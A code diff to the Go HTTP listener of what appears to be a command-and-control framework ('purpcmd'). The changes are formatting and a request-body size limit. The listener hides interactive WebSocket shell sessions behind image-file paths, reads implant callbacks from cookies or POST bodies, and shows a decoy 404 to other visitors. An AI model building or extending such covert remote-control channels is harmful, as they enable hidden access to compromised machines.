@@ -5,6 +5,7 @@ import (
 	"net/http"
 	"purpcmd/internal"
 	"purpcmd/server/callback"
+
 	//imp "purpcmd/server/implant"
 	"purpcmd/server/log"
 	"purpcmd/server/ssh"
@@ -14,7 +15,7 @@ import (
 	"github.com/gorilla/websocket"
 )
 
-func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
+func (l *Listener) root(w http.ResponseWriter, r *http.Request) {
 	if strings.Contains(r.URL.Path, ".png") || strings.Contains(r.URL.Path, ".jpg") || strings.Contains(r.URL.Path, ".gif") {
 		up := websocket.Upgrader{}
 		conn, err := up.Upgrade(w, r, nil)
@@ -22,8 +23,7 @@ func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
 			log.AsyncWriteStdoutErr(err.Error())
 			return
 		}
-	
-		
+
 		webSockConn := utils.New(conn) // New addapter
 		log.AsyncWriteStdoutInfo("initiating interactive session")
 		ssh.Connector(webSockConn)
@@ -31,8 +31,8 @@ func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	a,task := processPayload(r)
-	
+	a, task := processPayload(w, r)
+
 	if uint16(a) == internal.NIL {
 		w.WriteHeader(404)
 		w.Write([]byte("Page Not Found"))
@@ -50,13 +50,12 @@ func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("Hi!"))
 }
 
-
-func processPayload(r *http.Request) (uint16, []byte) {
+func processPayload(w http.ResponseWriter, r *http.Request) (uint16, []byte) {
 	var data []byte
 	var err error
 
 	name := r.URL.Query().Get("a")
-	
+
 	if r.Method == "GET" {
 		cookies := r.Cookies()
 		if len(cookies) == 0 {
@@ -65,6 +64,7 @@ func processPayload(r *http.Request) (uint16, []byte) {
 			data = []byte(cookies[0].Value)
 		}
 	} else if r.Method == "POST" {
+		r.Body = http.MaxBytesReader(w, r.Body, 10<<20) // 10 MB limit
 		data, err = io.ReadAll(r.Body)
 		if err != nil {
 			log.AsyncWriteStdout(err.Error())
@@ -72,6 +72,5 @@ func processPayload(r *http.Request) (uint16, []byte) {
 		}
 	}
 
-	
 	return callback.ParseCallback(data, r, name)
 }
